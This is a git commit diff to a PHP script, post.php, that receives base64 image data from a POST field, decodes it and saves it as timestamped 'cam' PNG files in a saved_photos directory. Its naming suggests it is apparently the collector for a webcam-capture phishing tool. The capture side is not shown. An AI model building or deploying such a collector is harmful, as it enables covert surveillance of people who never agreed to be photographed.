3b1ce7d1b36f009d5a602b8eaf0143f56fd4a2a6
47LeCoste <82815207+grugnoymeme@users.noreply.github.com>
2025-06-22 12:39:41 +0200

    Update post.php

--- post.php
+++ post.php
@@ -1,19 +1,30 @@
 <?php
-
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
+$imageData = $_POST['cat'];
 
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
+if (!empty($imageData)) {
+    error_log("Received" . "\r\n", 3, "Log.log");
 
+    // Remove base64 header (e.g., "data:image/png;base64,")
+    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
+
+    // Decode base64 data to binary
+    $unencodedData = base64_decode($filteredData);
+
+    // Ensure the directory 'saved_photos/' exists
+    $saveDir = 'saved_photos/';
+    if (!is_dir($saveDir)) {
+        mkdir($saveDir, 0755, true);
+    }
+
+    // Create full path for the file
+    $filePath = $saveDir . 'cam' . $date . '.png';
+
+    // Write binary data to the file
+    $fp = fopen($filePath, 'wb');
+    fwrite($fp, $unencodedData);
+    fclose($fp);
 }
-
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
 
 exit();
 ?>
-
